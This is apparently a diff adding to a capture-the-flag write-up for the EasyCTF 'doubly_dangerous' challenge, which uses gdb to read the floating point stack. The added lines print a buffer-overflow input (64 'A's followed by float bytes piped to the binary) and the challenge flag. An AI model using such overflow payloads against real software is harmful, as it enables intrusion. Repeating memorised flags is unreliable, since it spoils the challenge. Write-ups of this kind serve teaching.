@@ -10,3 +10,8 @@ gdb has a command called info float which displays the floating point stack at t
 I have uploaded screenshots to show exactly how it looks like. Note that they are expressed in the IEEE-754 notation.
 
 After hit and trial, I found that the value 0x41348000 is exactly equal to the value being compared to and hence will result in True condition.
+
+NOTE: to pass null vale as input, use echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x80\x34\x41" |
+ ./doubly_dangerous
+ 
+ flag : easyctf{bofs_and_floats_are_d0uble_tr0uble!}
